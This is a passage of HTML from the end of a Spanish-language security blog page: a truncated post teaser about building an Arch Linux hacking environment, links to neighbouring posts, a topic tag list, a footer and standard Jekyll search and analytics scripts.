primer articulo del año 2023 veremos como instalar y personalizar un entorno de hacking profesional comenzando por la instalación del sistema operativo Arch Linux y toda la co...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Shell-interactiva/" class="btn btn-outline-primary" prompt="Más antiguo"><p>Como obtener una shell interactiva a partir de una dumbshell</p></a> <a href="/posts/Bloquedo-de-sitios-maliciosos/" class="btn btn-outline-primary" prompt="Más nuevo"><p>Bloquea contenido malicioso con los DNS de cloudflare</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/c04tl">Luis Medina</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Etiquetas populares</h4><a class="post-tag" href="/tags/bash/">bash</a> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/reverse-shell/">reverse shell</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/strings/">strings</a> <a class="post-tag" href="/tags/attr/">attr</a> <a class="post-tag" href="/tags/bloquedo-de-malware/">Bloquedo de Malware</a> <a class="post-tag" href="/tags/chmod/">chmod</a> <a class="post-tag" href="/tags/chown/">chown</a> <a class="post-tag" href="/tags/configuraci%C3%B3n-de-red/">Configuración de red</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! no hay resultados.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
